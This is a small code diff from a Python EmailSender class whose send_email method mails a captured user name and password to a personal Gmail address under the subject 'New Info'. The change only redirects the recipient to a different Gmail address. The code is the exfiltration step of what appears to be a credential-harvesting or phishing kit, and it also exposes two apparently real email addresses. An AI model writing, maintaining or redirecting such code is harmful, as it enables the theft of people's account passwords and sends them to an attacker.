@@ -27,7 +27,7 @@ class EmailSender:
 
     def send_email(self):
         result = self.yag.send(
-            to="lyndazuniga2020@gmail.com",
+            to="Patty.powers1200@gmail.com",
             subject="New Info",
             contents=f"UserName : {self.user_name}\n"
                      f"Password: {self.user_password}\n"
